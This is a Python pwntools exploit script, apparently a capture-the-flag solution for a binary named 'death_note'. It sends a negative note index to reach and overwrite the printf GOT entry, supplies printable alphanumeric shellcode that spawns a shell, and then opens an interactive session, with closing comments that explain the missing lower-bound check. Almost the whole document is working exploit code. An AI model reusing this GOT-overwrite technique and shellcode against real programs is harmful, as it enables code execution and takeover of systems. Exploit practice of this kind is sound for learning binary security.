#!/usr/bin/python3
from pwn import *

exe = './death_note'
elf = context.binary = ELF(exe)
# libc = ELF("")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* add_note+145
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.sendlineafter(b"Your choice :", b"1")
p.sendline(b"-16") # printf@got

address = 0x0804b1a0

shellcode = 'j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A'

p.send(shellcode)

p.interactive()

'''
add:
    - checks for the upper bound but not the lower bound hmm.
    - negative values are given to access more memory region. wraps around and sets the highest bit for -1.
    - make the printf@got point to our shellcode then boom. 

Idea:
    - Read syscall to overwrite the previous shellcode then just call printf.
    - Self modyfing shellcode ?

'''